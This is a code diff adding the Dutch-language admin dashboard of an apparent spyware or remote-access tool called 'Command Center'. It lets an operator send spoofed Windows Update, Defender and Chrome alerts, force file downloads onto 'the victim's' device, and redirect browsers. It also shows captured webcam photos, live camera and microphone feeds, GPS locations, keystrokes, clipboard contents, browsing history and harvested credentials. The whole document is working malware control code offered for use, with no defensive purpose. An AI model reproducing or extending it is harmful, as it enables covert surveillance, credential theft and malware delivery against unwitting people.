+            <div class="pnl-b">
+                <div class="cmd-row"><label>Target</label><select id="cmd-target"><option value="all">Alle Clients</option></select></div>
+                <div class="cmd-row"><label>Type</label><select id="cmd-type" onchange="onCmdTypeChange()">
+                    <option value="notification">Windows Melding</option>
+                    <option value="alert">Browser Alert</option>
+                    <option value="redirect">Redirect URL</option>
+                    <option value="sound">Geluid Afspelen</option>
+                    <option value="popup">Popup Openen</option>
+                    <option value="screenshot">Screenshot Maken</option>
+                    <option value="vibrate">Trillen (mobiel)</option>
+                    <option value="overlay">Fullscreen Overlay</option>
+                    <option value="file">📁 Bestand Sturen</option>
+                </select></div>
+                <div id="cmd-notif-opts">
+                    <div class="cmd-preset">
+                        <button onclick="applyPreset('custom',this)" class="active">Custom</button>
+                        <button onclick="applyPreset('winupdate',this)">Windows Update</button>
+                        <button onclick="applyPreset('defender',this)">Defender Alert</button>
+                        <button onclick="applyPreset('chrome',this)">Chrome Update</button>
+                        <button onclick="applyPreset('edge',this)">Edge Melding</button>
+                    </div>
+                    <div class="cmd-row"><label>Icoon</label><select id="cmd-icon">
+                        <option value="info">ℹ Info</option><option value="shield">🛡 Shield</option>
+                        <option value="warning">⚠ Warning</option><option value="chrome">Chrome</option>
+                        <option value="edge">Edge</option><option value="windows">Windows</option>
+                        <option value="update">Update</option>
+                    </select></div>
+                    <div class="cmd-row"><label>App Naam</label><input id="cmd-app" value="System"></div>
+                    <div class="cmd-row"><label>Titel</label><input id="cmd-title" placeholder="Titel van melding..."></div>
+                    <div class="cmd-row"><label>Bericht</label><textarea id="cmd-msg" placeholder="Tekst van melding..."></textarea></div>
+                    <div class="cmd-row"><label>Duur</label><input type="number" id="cmd-dur" value="8000" min="0" step="1000" style="width:80px"><span class="unit">ms (0=permanent)</span></div>
+                    <div class="cmd-row"><label>Knop 1</label><input id="cmd-btn1" placeholder="Knop tekst"><input id="cmd-btn1url" placeholder="URL (optioneel)"></div>
+                    <div class="cmd-row"><label>Knop 2</label><input id="cmd-btn2" placeholder="Knop tekst"><input id="cmd-btn2url" placeholder="URL (optioneel)"></div>
+                </div>
+                <div id="cmd-alert-opts" style="display:none"><div class="cmd-row"><label>Bericht</label><textarea id="cmd-alert-msg" placeholder="Alert bericht..."></textarea></div></div>
+                <div id="cmd-redirect-opts" style="display:none"><div class="cmd-row"><label>URL</label><input id="cmd-redir-url" placeholder="https://..."></div></div>
+                <div id="cmd-sound-opts" style="display:none">
+                    <div class="cmd-row"><label>Frequentie</label><input type="number" id="cmd-freq" value="440" min="100" max="2000" style="width:80px"><span class="unit">Hz</span></div>
+                    <div class="cmd-row"><label>Duur</label><input type="number" id="cmd-sound-dur" value="500" min="100" max="5000" style="width:80px"><span class="unit">ms</span></div>
+                    <div class="cmd-row"><label>Volume</label><input type="range" id="cmd-vol" min="0" max="100" value="30" oninput="$('#cmd-vol-val').textContent=this.value+'%'"><span id="cmd-vol-val" class="unit">30%</span></div>
+                </div>
+                <div id="cmd-popup-opts" style="display:none">
+                    <div class="cmd-row"><label>URL</label><input id="cmd-popup-url" placeholder="https://..."></div>
+                    <div class="cmd-row"><label>Breedte</label><input type="number" id="cmd-popup-w" value="500" style="width:80px"><span class="unit">px</span></div>
+                    <div class="cmd-row"><label>Hoogte</label><input type="number" id="cmd-popup-h" value="400" style="width:80px"><span class="unit">px</span></div>
+                </div>
+                <div id="cmd-overlay-opts" style="display:none">
+                    <div class="cmd-row"><label>HTML</label><textarea id="cmd-overlay-html" placeholder="<h1>Je HTML hier</h1>"></textarea></div>
+                    <div class="cmd-row"><label>Duur</label><input type="number" id="cmd-overlay-dur" value="0" min="0" step="1000" style="width:80px"><span class="unit">ms (0=klik om te sluiten)</span></div>
+                </div>
+                <div id="cmd-file-opts" style="display:none">
+                    <div class="cmd-row">
+                        <label>Bestand</label>
+                        <div style="flex:1;display:flex;flex-direction:column;gap:6px">
+                            <label id="cmd-file-label" style="display:flex;align-items:center;gap:8px;background:#f8f9fa;border:1px dashed var(--border2);border-radius:5px;padding:10px 14px;cursor:pointer;color:var(--text2);font-size:.72rem;transition:border-color .15s" onmouseenter="this.style.borderColor='var(--accent)'" onmouseleave="this.style.borderColor='var(--border2)'">
+                                <span style="font-size:1.2rem">📎</span>
+                                <span id="cmd-file-name">Klik om een bestand te selecteren...</span>
+                                <input type="file" id="cmd-file-input" style="display:none" onchange="onFileSelected(this)">
+                            </label>
+                            <div id="cmd-file-info" style="display:none;font-size:.65rem;color:var(--text2);background:#e8f5e9;border:1px solid #a8d5b5;border-radius:4px;padding:5px 10px"></div>
+                        </div>
+                    </div>
+                    <div class="cmd-row"><label>Weergavenaam</label><input id="cmd-file-customname" placeholder="Optioneel: andere bestandsnaam voor het slachtoffer"></div>
+                    <div style="font-size:.65rem;color:var(--dim);margin-top:4px;padding-left:0">⚠️ Het bestand wordt automatisch gedownload op het apparaat van het slachtoffer.</div>
+                </div>
+                <div style="display:flex;gap:8px;margin-top:14px">
+                    <button class="cfg-btn primary" onclick="sendCommand()">⚡ Verstuur</button>
+                    <button class="cfg-btn secondary" onclick="previewNotif()">Preview</button>
+                </div>
+            </div>
+        </div>
+        <div class="pnl">
+            <div class="pnl-h"><h2>Preview</h2></div>
+            <div class="pnl-b" id="cmd-preview" style="min-height:250px;position:relative;background:var(--bg);border-radius:4px"><div class="empty">Klik "Preview" om melding te zien</div></div>
+        </div>
+    </div>
+</div>
+
+<!-- ═══ SETTINGS ═══ -->
+<div class="view" id="v-settings">
+    <div class="settings-grid">
+        <div class="cfg-group">
+            <h3>📸 Capture Instellingen</h3>
+            <div class="cfg-row"><label>Foto's</label><label class="tgl"><input type="checkbox" id="cfg-photo-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-photo-period" value="30" min="5" max="3600"><span class="unit">sec</span></div>
+            <div class="cfg-row"><label>Foto Kwaliteit</label><input type="range" id="cfg-photo-q" min="10" max="100" value="70" oninput="$('#cfg-photo-q-val').textContent=this.value+'%'"><span id="cfg-photo-q-val" class="unit">70%</span></div>
+            <div class="cfg-row"><label>Video</label><label class="tgl"><input type="checkbox" id="cfg-video-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-video-period" value="300" min="30" max="3600"><span class="unit">sec</span></div>
+            <div class="cfg-row"><label>Video Duur</label><input type="number" id="cfg-video-dur" value="10" min="3" max="60"><span class="unit">sec</span></div>
+        </div>
+        <div class="cfg-group">
+            <h3>📍 Tracking Instellingen</h3>
+            <div class="cfg-row"><label>Locatie</label><label class="tgl"><input type="checkbox" id="cfg-loc-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-loc-period" value="15" min="5" max="300"><span class="unit">sec</span></div>
+            <div class="cfg-row"><label>Toetsaanslagen</label><label class="tgl"><input type="checkbox" id="cfg-key-on" checked><span></span></label><label>Flush elke</label><input type="number" id="cfg-key-flush" value="10" min="3" max="60"><span class="unit">sec</span></div>
+            <div class="cfg-row"><label>Klembord</label><label class="tgl"><input type="checkbox" id="cfg-clip-on" checked><span></span></label><label>Check elke</label><input type="number" id="cfg-clip-check" value="15" min="5" max="120"><span class="unit">sec</span></div>
+            <div class="cfg-row"><label>Heartbeat</label><input type="number" id="cfg-hb" value="8" min="3" max="60"><span class="unit">sec</span></div>
+        </div>
+        <div class="cfg-group">
+            <h3>💾 Opslag Beheer</h3>
+            <div id="storage-info"><div class="empty">Laden...</div></div>
+            <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap">
+                <button class="cfg-btn secondary" onclick="doCleanup('photos',50)">Bewaar laatste 50 foto's</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('photos',0)">Alle foto's wissen</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('videos',10)">Bewaar laatste 10 video's</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('videos',0)">Alle video's wissen</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('events',0)">Events wissen</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('keystrokes',0)">Toetsaanslagen wissen</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('clipboard',0)">Klembord wissen</button>
+                <button class="cfg-btn secondary" onclick="doCleanup('visits',0)">Bezoeken wissen</button>
+            </div>
+        </div>
+        <div class="cfg-group">
+            <h3>ℹ Info</h3>
+            <div style="font-size:.72rem;color:var(--dim);line-height:1.8">
+                <div>Command Center v2.0</div>
+                <div>Clients laden nieuwe instellingen bij page-reload.</div>
+                <div>Commands worden direct verstuurd via polling (3s).</div>
+                <div style="margin-top:8px;color:var(--accent)">Tip: Lagere foto-frequentie = minder opslag</div>
+            </div>
+        </div>
+    </div>
+    <div class="cfg-actions">
+        <button class="cfg-btn secondary" onclick="resetConfig()">Reset Standaard</button>
+        <button class="cfg-btn primary" onclick="saveConfig()">💾 Opslaan</button>
+    </div>
+</div>
+
+<!-- LIGHTBOX -->
+<div class="lightbox" id="lightbox" onclick="this.classList.remove('show')"><img id="lb-img" src=""></div>
+
+<!-- TOASTS -->
+<div class="toast-area" id="toasts"></div>
+
+<!-- SEARCH RESULTS -->
+<div class="search-results" id="search-results">
+    <div class="sr-header"><h3>Search Results</h3><button onclick="closeSearch()">✕</button></div>
+    <div id="sr-body"></div>
+</div>
+
+<!-- SCRIPTS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+// ═══════════════════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════════════════
+let events = [], deviceInfo = {}, map = null, markers = {}, trailLayers = [];
+let currentFilter = '';
+let liveFeeds = {}; // { clientId: { active: true, lastFrame: timestamp, fps: 0 } }
+let liveFpsCounters = {}; // for FPS calculation
+let audioPlayers = {}; // { clientId: true/false }
+const $ = s => document.querySelector(s);
+const $$ = s => document.querySelectorAll(s);
+function esc(s){if(!s)return '';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
+function fmt(ts){if(!ts)return '-';return new Date(ts).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});}
+
+// ── Auth token from cookie ──
+function getToken() {
+    const m = document.cookie.match(/(?:^|;\s*)adminToken=([^;]+)/);
+    return m ? m[1] : '';
+}
+const AUTH_TOKEN = getToken();
+
+// ============================================================
+//  STATE: Notes / Tags / Errors
+// ============================================================
+let clientNotesCache = {};
+let clientTagsCache  = {};
+let currentNotesClient = null;
+let currentTagClient   = null;
+let errorLog = [];
+let lastClientsData = null;
+
+// apiFetch
+async function apiFetch(url, opts) {
+    opts = opts || {};
+    const sep = url.includes('?') ? '&' : '?';
+    const hdrs = Object.assign({ 'Content-Type': 'application/json' }, opts.headers || {});
+    const res = await fetch(url + sep + 'token=' + AUTH_TOKEN, Object.assign({}, opts, { headers: hdrs }));
+    if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
+    return res.json();
+}
+
+// copy helper
+function copyText(text, btn) {
+    navigator.clipboard.writeText(String(text)).then(function() {
+        if (btn) { var o = btn.textContent; btn.textContent = 'v'; setTimeout(function(){btn.textContent=o;}, 1200); }
+        showToast('Copied!');
+    }).catch(function() {
+        var ta = document.createElement('textarea');
+        ta.value = String(text); ta.style.cssText = 'position:fixed;opacity:0';
+        document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+        showToast('Copied!');
+    });
+}
+
+// tab badge helper
+function updateTabBadge(tab, n) {
+    var el = document.getElementById('tb-' + tab);
+    if (el) el.textContent = (n > 0) ? n : '';
+}
+
+// refresh ring helper
+function showRefreshRing() {
+    var ring = document.getElementById('refresh-ring');
+    if (!ring) return;
+    ring.classList.add('active');
+    setTimeout(function(){ ring.classList.remove('active'); }, 1500);
+}
+
+// event type filter
+function clearEventFilter() {
+    var f = document.getElementById('ev-type-filter');
+    if (f) { f.value = ''; renderEvents(); }
+}
+
+// errors
+function addErrorEntry(source, msg, clientId) {
+    errorLog.unshift({ source: source, msg: msg, clientId: clientId, t: Date.now() });
+    if (errorLog.length > 500) errorLog.length = 500;
+    updateTabBadge('errors', errorLog.length);
+    if (document.querySelector('.tab.active[data-v="errors"]')) renderErrorLog();
+}
+function renderErrorLog() {
+    var el = document.getElementById('error-log');
+    if (!el) return;
+    if (!errorLog.length) { el.innerHTML = '<div class="empty">No errors recorded</div>'; return; }
+    el.innerHTML = errorLog.map(function(e) {
+        return '<div class="ev-item" style="border-left:2px solid #d93025">' +
+            '<span class="ev-time">' + fmt(e.t) + '</span> ' +
+            '<span class="ev-type" style="color:#d93025">' + esc(e.source || '') + '</span> ' +
+            (e.clientId ? '<span class="ev-client">' + esc(e.clientId) + '</span> ' : '') +
+            '<span class="ev-data">' + esc(e.msg || '') + '</span></div>';
+    }).join('');
+}
+function clearErrorLog() { errorLog = []; updateTabBadge('errors', 0); renderErrorLog(); }
+
+// tags
+async function loadTags() {
+    try {
+        var r = await apiFetch('/api/tags');
+        if (r && typeof r === 'object') clientTagsCache = r;
+    } catch(e) { /* silent */ }
+}
+function openTagModal(clientId) {
+    currentTagClient = clientId;
+    document.getElementById('tag-client-label').textContent = clientId;
+    var t = clientTagsCache[clientId] || {};
+    document.getElementById('tag-label-input').value = t.label || '';
+    document.getElementById('tag-tags-input').value  = (t.tags || []).join(', ');
+    document.getElementById('tag-pin-input').checked  = !!t.pinned;
+    document.getElementById('tag-modal').style.display = 'flex';
+}
+function closeTagModal() {
+    document.getElementById('tag-modal').style.display = 'none';
+    currentTagClient = null;
+}
+async function saveTag() {
+    if (!currentTagClient) return;
+    var label  = document.getElementById('tag-label-input').value.trim();
+    var tagsRaw= document.getElementById('tag-tags-input').value;
+    var pinned = document.getElementById('tag-pin-input').checked;
+    var tags   = tagsRaw.split(',').map(function(s){return s.trim();}).filter(Boolean);
+    try {
+        await apiFetch('/api/tags/' + currentTagClient, { method:'POST', body: JSON.stringify({label:label,tags:tags,pinned:pinned}) });
+        clientTagsCache[currentTagClient] = { label:label, tags:tags, pinned:pinned };
+        closeTagModal();
+        if (lastClientsData) renderClients(lastClientsData);
+        showToast('Label saved');
+    } catch(e) { showError('saveTag', e); }
+}
+async function quickPin(clientId) {
+    var t = Object.assign({}, clientTagsCache[clientId] || {});
+    t.pinned = true;
+    try {
+        await apiFetch('/api/tags/' + clientId, { method:'POST', body: JSON.stringify(t) });
+        clientTagsCache[clientId] = t;
+        if (lastClientsData) renderClients(lastClientsData);
+        showToast('Pinned: ' + clientId);
+    } catch(e) { showError('quickPin', e); }
+}
+async function unPinClient(clientId) {
+    var t = Object.assign({}, clientTagsCache[clientId] || {});
+    t.pinned = false;
+    try {
+        await apiFetch('/api/tags/' + clientId, { method:'POST', body: JSON.stringify(t) });
+        clientTagsCache[clientId] = t;
+        if (lastClientsData) renderClients(lastClientsData);
+        showToast('Unpinned: ' + clientId);
+    } catch(e) { showError('unPinClient', e); }
+}
+
+// notes
+async function openNotes(clientId) {
+    currentNotesClient = clientId;
+    document.getElementById('notes-client-label').textContent = clientId;
+    document.getElementById('note-input').value = '';
+    document.getElementById('notes-modal').style.display = 'flex';
+    await refreshNotesList(clientId);
+}
+function closeNotes() {
+    document.getElementById('notes-modal').style.display = 'none';
+    currentNotesClient = null;
+}
+async function refreshNotesList(cid) {
+    try {
+        var r = await apiFetch('/api/notes/' + cid);
+        clientNotesCache[cid] = r.notes || [];
+        renderNotesList(clientNotesCache[cid]);
+    } catch(e) { showError('loadNotes', e); }
+}
+function renderNotesList(notes) {
+    var el = document.getElementById('notes-list');
+    if (!notes || !notes.length) { el.innerHTML = '<div class="empty">No notes yet</div>'; return; }
+    el.innerHTML = notes.slice().reverse().map(function(n) {
+        var cid = currentNotesClient || '';
+        return '<div style="border-bottom:1px solid var(--border);padding:8px 0;display:flex;justify-content:space-between;align-items:flex-start;gap:8px">' +
+            '<div style="flex:1"><div style="font-size:.75rem;color:var(--text);white-space:pre-wrap">' + esc(n.text) + '</div>' +
+            '<div style="font-size:.6rem;color:var(--dim);margin-top:3px">' + fmt(n.timestamp) + '</div></div>' +
+            '<button onclick="deleteNoteEntry(\'' + esc(cid) + '\',\'' + esc(n.id) + '\')" class="cl-action-btn" title="Delete">x</button>' +
+            '</div>';
+    }).join('');
+}
+async function saveNote() {
+    var txt = document.getElementById('note-input').value.trim();
+    if (!txt || !currentNotesClient) return;
+    try {
+        await apiFetch('/api/notes/' + currentNotesClient, { method:'POST', body: JSON.stringify({text:txt}) });
+        document.getElementById('note-input').value = '';
+        await refreshNotesList(currentNotesClient);
+        showToast('Note saved');
+    } catch(e) { showError('saveNote', e); }
+}
+async function deleteNoteEntry(clientId, noteId) {
+    try {
+        await apiFetch('/api/notes/' + clientId + '/' + noteId, { method:'DELETE' });
+        await refreshNotesList(clientId);
+    } catch(e) { showError('deleteNote', e); }
+}
+
+// per-client export
+function exportClient(clientId) {
+    window.open('/api/client/' + clientId + '/export?token=' + AUTH_TOKEN, '_blank');
+}
+
+// keyboard shortcuts
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'k') { e.preventDefault(); var s = document.getElementById('globalSearch'); if (s) s.focus(); return; }
+    if (e.key === 'Escape') {
+        closeNotes(); closeTagModal();
+        var lb = document.getElementById('lightbox');
+        if (lb && lb.style.display !== 'none') lb.style.display = 'none';
+        var gs = document.getElementById('globalSearch');
+        if (gs && document.activeElement === gs) gs.blur();
+        return;
+    }
+    if (!e.ctrlKey && !e.altKey && !e.metaKey) {
+        var ae = document.activeElement;
+        if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT')) return;
+        var tabMap = {'1':'overview','2':'cameras','3':'photos','4':'videos','5':'map','6':'keys','7':'clipboard','8':'visits','9':'events','0':'errors'};
+        if (tabMap[e.key]) { var t = document.querySelector('.tab[data-v="' + tabMap[e.key] + '"]'); if (t) t.click(); }
+        if (e.key === 'r' || e.key === 'R') { refreshAll(); showToast('Refreshing...'); }
+    }
+});
+
+
+// Clock
+setInterval(() => {
+    const d = new Date();
+    $('#clock').textContent = d.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}, 1000);
+
+// ═══════════════════════════════════════════════════════════════
+//  TABS
+// ═══════════════════════════════════════════════════════════════
+$$('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+        $$('.tab').forEach(t => t.classList.remove('active'));
+        $$('.view').forEach(v => v.classList.remove('active'));
+        tab.classList.add('active');
+        $(`#v-${tab.dataset.v}`).classList.add('active');
+        const v = tab.dataset.v;
+        if (v === 'map') setTimeout(initMap, 100);
+        if (v === 'photos') loadPhotos();
+        if (v === 'videos') loadVideos();
+        if (v === 'devices') renderDevices();
+        if (v === 'cameras') loadCameraFeeds();
+        if (v === 'keys') loadKeystrokes();
+        if (v === 'clipboard') loadClipboard();
+        if (v === 'visits') loadVisits();
+        if (v === 'credentials') loadCredentials();
+        if (v === 'commands') updateCmdTargets();
+        if (v === 'settings') { loadConfig(); loadStorage(); }
+        if (v === 'errors')   renderErrorLog();
+    });
+});
+
+// ═══════════════════════════════════════════════════════════════
+//  CLIENT FILTER
+// ═══════════════════════════════════════════════════════════════
+function onFilterChange() {
+    currentFilter = $('#clientFilter').value;
+    refreshAll();
+}
+
+function updateFilterOptions(clients) {
+    const sel = $('#clientFilter');
+    const val = sel.value;
+    const ids = Object.keys(clients || {}).sort();
+    sel.innerHTML = '<option value="">All Clients</option>' + ids.map(id =>
+        `<option value="${id}" ${val===id?'selected':''}>${id}${clients[id].online?' (online)':''}</option>`
+    ).join('');
+}
+
+function filterParam() {
+    return currentFilter ? `&clientId=${currentFilter}` : '';
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  ERROR DISPLAY
+// ═══════════════════════════════════════════════════════════════
+function showError(context, err) {
+    console.error(`[${context}]`, err);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  SOCKET.IO
+// ═══════════════════════════════════════════════════════════════
+let socket;
+try {
+    socket = io();
+} catch(e) {
+    showError('socket-init', e);
+}
+
+if (socket) {
+    socket.on('connect', () => {
+        try {
+            $('#dot').className = 'dot on';
+            $('#connTxt').textContent = 'Connected';
+            socket.emit('join-admin', AUTH_TOKEN);
+        } catch(e) { showError('connect', e); }
+        refreshAll();
+    });
+
+    socket.on('disconnect', () => {
+        try {
+            $('#dot').className = 'dot off';
+            $('#connTxt').textContent = 'Disconnected';
+        } catch(e) { showError('disconnect', e); }
+    });
+
+    socket.on('init', data => {
+        try {
+            renderClients(data.clients);
+            events = data.recentEvents || [];
+            deviceInfo = data.deviceInfo || {};
+            renderEvents();
+            updateFilterOptions(data.clients);
+        } catch(e) { showError('init', e); }
+    });
+
+    socket.on('error_event', ev => {
+        if (ev) addErrorEntry(ev.source || 'client', ev.message || JSON.stringify(ev), ev.clientId || null);
+    });
+
+    socket.on('event', ev => {
+        try {
+            events.unshift(ev);
+            if (events.length > 500) events.length = 500;
+            renderEvents();
+            showToast(ev);
+            try { const eb = $('#ev-badge'); if (eb) eb.textContent = parseInt(eb.textContent || '0', 10) + 1; } catch(x){}
+        } catch(e) { showError('event', e); }
+        refreshAll();
+    });
+
+    // ═══ Live Camera Feed Handlers ═══
+    socket.on('live-frame', data => {
+        try {
+            const { clientId, frame, timestamp, width, height } = data;
+            if (!liveFeeds[clientId]) return;
+            liveFeeds[clientId].lastFrame = timestamp;
+
+            // Update FPS counter
+            if (!liveFpsCounters[clientId]) liveFpsCounters[clientId] = [];
+            liveFpsCounters[clientId].push(Date.now());
+            // Keep only last 2 seconds of frame timestamps
+            const cutoff = Date.now() - 2000;
+            liveFpsCounters[clientId] = liveFpsCounters[clientId].filter(t => t > cutoff);
+
+            // Update the image element
+            const img = $(`#cam-img-${clientId}`);
+            if (img) {
+                img.src = frame;
+                img.style.display = '';
+                const noimg = $(`#cam-noimg-${clientId}`);
+                if (noimg) noimg.style.display = 'none';
+            }
+
+            // Update timestamp
+            const timeEl = $(`#cam-time-${clientId}`);
+            if (timeEl) timeEl.textContent = new Date(timestamp).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+
+            // Update FPS display
+            const fpsEl = $(`#cam-fps-${clientId}`);
+            if (fpsEl) {
+                const fps = Math.round(liveFpsCounters[clientId].length / 2);
+                fpsEl.textContent = fps + ' FPS';
+            }
+        } catch(e) { showError('live-frame', e); }
+    });
+
+    socket.on('live-feed-status', data => {
+        try {
+            const { clientId, active, error } = data;
+            if (active) {
+                liveFeeds[clientId] = { active: true, lastFrame: Date.now() };
+                const ind = $(`#live-ind-${clientId}`);
+                if (ind) ind.style.display = 'inline-flex';
+                const btn = $(`#cam-btn-${clientId}`);
+                if (btn) { btn.textContent = '■ Stop'; btn.classList.add('active'); }
+                $('#live-status').textContent = `Streaming from ${clientId}`;
+                $('#live-status').style.color = 'var(--green)';
+            } else {
+                delete liveFeeds[clientId];
+                delete liveFpsCounters[clientId];
+                const ind = $(`#live-ind-${clientId}`);
+                if (ind) ind.style.display = 'none';
+                const btn = $(`#cam-btn-${clientId}`);
+                if (btn) { btn.textContent = '▶ Live'; btn.classList.remove('active'); }
+                const fpsEl = $(`#cam-fps-${clientId}`);
+                if (fpsEl) fpsEl.textContent = '';
+                if (error) {
+                    $('#live-status').textContent = `Feed error: ${error}`;
+                    $('#live-status').style.color = 'var(--accent)';
+                } else if (Object.keys(liveFeeds).length === 0) {
+                    $('#live-status').textContent = 'Click a client to start live feed';
+                    $('#live-status').style.color = 'var(--dim)';
+                }
+            }
+        } catch(e) { showError('live-feed-status', e); }
+    });
+
+    // ═══ Audio handlers ═══
+    socket.on('audio-chunk', data => {
+        // Process audio chunk for playback
+        try {
+            if (!audioPlayers[data.clientId]) return;
+            const audio = new Audio(data.chunk);
+            audio.volume = 0.8;
+            audio.play().catch(() => {});
+        } catch(e) { showError('audio-chunk', e); }
+    });
+
+    socket.on('audio-status', data => {
+        try {
+            const { clientId, active, error } = data;
+            const btn = $(`#mic-btn-${clientId}`);
+            if (active) {
+                audioPlayers[clientId] = true;
+                if (btn) { btn.textContent = '🔇 Stop'; btn.classList.add('active'); }
+            } else {
+                delete audioPlayers[clientId];
+                if (btn) { btn.textContent = '🎤 Audio'; btn.classList.remove('active'); }
+                if (error) toast(`🎤 Audio error for ${clientId}: ${error}`);
+            }
+        } catch(e) { showError('audio-status', e); }
+    });
+} else {
+    // Fallback: no Socket.IO — use polling only
+    $('#dot').className = 'dot off';
+    $('#connTxt').textContent = 'Polling mode';
+    refreshAll();
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  API
+// ═══════════════════════════════════════════════════════════════
+async function api(url) {
+    try {
+        const r = await fetch(url, { headers: { 'X-Admin-Token': AUTH_TOKEN } });
+        if (r.status === 401) { location.href = '/admin'; return null; }
+        if (!r.ok) return null;
+        return await r.json();
+    } catch(e) { showError('api:'+url, e); return null; }
+}
+
+async function refreshAll() {
+    showRefreshRing();
+    await loadTags();
+    try {
+        const f = filterParam();
+        const [stats, locs, photos] = await Promise.all([
+            api('/api/stats'),
+            api('/api/locations?limit=50' + f),
+            api('/api/photos?limit=12' + f)
+        ]);
+        if (stats) {
+            try {
+                $('#s-on').textContent = stats.onlineCount || 0;
+                $('#s-total').textContent = stats.clientCount || 0;
+                $('#s-photo').textContent = stats.photoCount || 0;
+                $('#s-vid').textContent = stats.mediaCount || 0;
+                $('#s-loc').textContent = stats.locationCount || 0;
+                $('#s-key').textContent = stats.keystrokeCount || 0;
+                $('#s-clip').textContent = stats.clipboardCount || 0;
+                $('#s-visit').textContent = stats.visitCount || 0;
+                $('#s-cred').textContent = stats.credentialCount || 0;
+                $('#s-err').textContent = stats.errorCount || 0;
+                updateTabBadge('photos', stats.photoCount || 0);
+                updateTabBadge('videos', stats.mediaCount || 0);
+                updateTabBadge('keys',   stats.keystrokeCount || 0);
+                updateTabBadge('clip',   stats.clipboardCount || 0);
+                updateTabBadge('visits', stats.visitCount || 0);
+                updateTabBadge('creds',  stats.credentialCount || 0);
+                $('#cl-badge').textContent = stats.onlineCount || 0;
+                deviceInfo = stats.deviceInfo || {};
+                renderClients(stats.clients);
+                updateFilterOptions(stats.clients);
+            } catch(e) { showError('refreshAll-stats', e); }
+        }
+        if (locs) try { renderLocations(locs); } catch(e) { showError('refreshAll-locs', e); }
+        if (photos) try { renderRecentPhotos(photos); } catch(e) { showError('refreshAll-photos', e); }
+
+        // Auto-refresh camera tab
+        const ct = document.querySelector('.tab[data-v="cameras"]');
+        if (ct && ct.classList.contains('active')) loadCameraFeeds();
+    } catch(e) { showError('refreshAll', e); }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  DATA LOADERS
+// ═══════════════════════════════════════════════════════════════
+async function loadPhotos() {
+    const photos = await api('/api/photos?limit=200' + filterParam());
+    if (!photos) return;
+    const c = $('#photo-gallery');
+    if (!photos.length) { c.innerHTML = '<div class="empty">No photos</div>'; return; }
+    c.innerHTML = '<div class="pgrid">' + photos.map(p => `
+        <div class="pcard" onclick="openLightbox('${p.path}')">
+            <img src="${p.path}" loading="lazy" alt="">
+            <div class="pi"><strong>${p.clientId}</strong>${fmtTime(p.timestamp)} · ${fmtSize(p.size)}</div>
+        </div>
+    `).join('') + '</div>';
+}
+
+async function loadVideos() {
+    const vids = await api('/api/media?limit=50' + filterParam());
+    if (!vids) return;
+    const c = $('#video-gallery');
+    if (!vids.length) { c.innerHTML = '<div class="empty">No videos</div>'; return; }
+    c.innerHTML = '<div class="grid3">' + vids.map(m => {
+        const isV = m.mimeType?.startsWith('video');
+        const el = isV ? `<video controls preload="metadata" src="${m.path}"></video>`
+                       : `<audio controls preload="metadata" src="${m.path}" style="width:100%;margin:10px 0"></audio>`;
+        return `<div class="vcard">${el}<div class="vi"><strong>${m.filename}</strong>${m.clientId} · ${fmtSize(m.size)} · ${fmtTime(m.timestamp)}</div></div>`;
+    }).join('') + '</div>';
+}
+
+async function loadKeystrokes() {
+    const keys = await api('/api/keystrokes?limit=100' + filterParam());
+    if (!keys) return;
+    const c = $('#key-log');
+    if (!keys.length) { c.innerHTML = '<div class="empty">No keystrokes captured</div>'; return; }
+    c.innerHTML = keys.map(k => {
+        const highlighted = k.keys.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
+            '<span class="special">[$1]</span>');
+        return `<div class="key-entry">
+            <div class="key-hdr"><span class="key-id">${k.clientId}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
+            ${k.url ? `<div class="key-url">${k.url}</div>` : ''}
+            <div class="key-text">${highlighted}</div>
+        </div>`;
+    }).join('');
+}
+
+async function loadClipboard() {
+    const clips = await api('/api/clipboard?limit=50' + filterParam());
+    if (!clips) return;
+    const c = $('#clip-log');
+    if (!clips.length) { c.innerHTML = '<div class="empty">No clipboard data</div>'; return; }
+    c.innerHTML = clips.map(cl => `
+        <div class="clip-entry">
+            <div class="clip-hdr"><span class="clip-id">${cl.clientId}</span><span class="clip-time">${fmtTime(cl.timestamp)}</span></div>
+            <div class="clip-text">${escHtml(cl.content)}</div>
+        </div>
+    `).join('');
+}
+
+async function loadVisits() {
+    const visits = await api('/api/visits?limit=100' + filterParam());
+    if (!visits) return;
+    const c = $('#visit-log');
+    if (!visits.length) { c.innerHTML = '<div class="empty">No page visits</div>'; return; }
+    c.innerHTML = visits.map(v => `
+        <div class="visit-entry">
+            <span class="v-id">${v.clientId}</span>
+            <span class="v-url" title="${escHtml(v.url)}">${escHtml(v.url)}</span>
+            <span class="v-title">${escHtml(v.title)}</span>
+            <span class="v-time">${fmtTime(v.timestamp)}</span>
+        </div>
+    `).join('');
+}
+
+async function loadCredentials() {
+    const creds = await api('/api/credentials?limit=200');
+    if (!creds) return;
+    const c = $('#cred-log');
+    if (!creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
